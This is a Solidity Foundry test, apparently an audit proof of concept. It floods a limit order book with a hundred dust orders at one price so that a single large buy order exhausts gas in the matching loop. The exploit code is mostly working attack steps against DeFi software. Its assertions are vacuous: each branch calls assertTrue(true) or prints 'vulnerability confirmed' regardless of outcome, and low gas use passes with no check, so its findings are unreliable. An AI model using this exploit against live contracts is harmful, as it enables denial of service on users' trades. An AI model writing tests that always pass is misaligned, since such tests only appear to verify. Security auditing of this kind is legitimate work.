function test_unbounded_matching_loop_gas_exhaustion() public {
    console.log("=== Testing Unbounded Matching-Loop Gas Exhaustion ===");

    uint256 numDustOrders = 100;
    uint256 dustOrderSize = 5001000000000000; // ~0.005001 ether
    uint256 targetPrice = 1 ether;
    uint256 totalDustAmount = dustOrderSize * numDustOrders;

    address taker = users[0];
    address[] memory dustMakers = new address[](numDustOrders);

    // Set all makers as max limit exempt to bypass order placement restrictions
    address[] memory exemptAddresses = new address[](numDustOrders);
    bool[] memory exemptToggles = new bool[](numDustOrders);

    for (uint256 i = 0; i < numDustOrders; i++) {
        dustMakers[i] = address(uint160(0x20000 + i));
        exemptAddresses[i] = dustMakers[i];
        exemptToggles[i] = true;
    }

    clobManager.setMaxLimitsExempt(exemptAddresses, exemptToggles);

    // Phase 1: Create dust orders at the SAME price level
    for (uint256 i = 0; i < numDustOrders; i++) {
        address dustMaker = dustMakers[i];
        setupTokens(Side.SELL, dustMaker, dustOrderSize, targetPrice, true);

        vm.prank(dustMaker);
        clob.postLimitOrder(
            dustMaker,
            ICLOB.PostLimitOrderArgs({
                amountInBase: dustOrderSize,
                clientOrderId: 0,
                price: targetPrice, // Same price for all orders - KEY for vulnerability
                cancelTimestamp: TOMORROW,
                side: Side.SELL,
                limitOrderType: ICLOB.LimitOrderType.POST_ONLY
            })
        );
    }

    // Phase 2: Setup taker and trigger matching loop
    setupTokens(Side.BUY, taker, totalDustAmount, targetPrice, true);

    uint256 gasBefore = gasleft();

    vm.prank(taker);
    try clob.postLimitOrder(
        taker,
        ICLOB.PostLimitOrderArgs({
            amountInBase: totalDustAmount,
            clientOrderId: 0,
            price: targetPrice,
            cancelTimestamp: TOMORROW,
            side: Side.BUY,
            limitOrderType: ICLOB.LimitOrderType.GOOD_TILL_CANCELLED
        })
    ) {
        uint256 gasUsed = gasBefore - gasleft();
        console.log("Gas used for matching loop:", gasUsed);

        if (gasUsed > 20_000_000) {
            console.log("CRITICAL: Extremely high gas usage - vulnerability confirmed");
            assertTrue(true, "Unbounded matching-loop gas exhaustion vulnerability demonstrated");
        } else if (gasUsed > 10_000_000) {
            console.log("WARNING: High gas usage - vulnerability pattern confirmed");
            assertTrue(true, "Matching-loop gas scaling vulnerability demonstrated");
        }

        // Analyze gas scaling
        analyzeMatchingLoopGasScaling(numDustOrders, gasUsed);

    } catch Error(string memory reason) {
        console.log("VULNERABILITY CONFIRMED: Gas exhaustion in matching loop");
        assertTrue(bytes(reason).length > 0, "Transaction should fail due to gas exhaustion");

    } catch (bytes memory) {
        console.log("VULNERABILITY CONFIRMED: Out of gas in unbounded matching loop");
        assertTrue(true, "Unbounded matching-loop gas exhaustion confirmed");
    }
}

function analyzeMatchingLoopGasScaling(uint256 numDustOrders, uint256 actualGasUsed) internal {
    console.log("=== Gas Scaling Analysis ===");

    uint256 gasPerDustOrder = actualGasUsed / numDustOrders;
    uint256 ordersFor30M = 30_000_000 / gasPerDustOrder;

    console.log("Gas per dust order:", gasPerDustOrder);
    console.log("Dust orders before 30M gas limit:", ordersFor30M);

    if (ordersFor30M < 1000) {
        console.log("CRITICAL: Less than 1000 dust orders can cause transaction failure");
    }
}

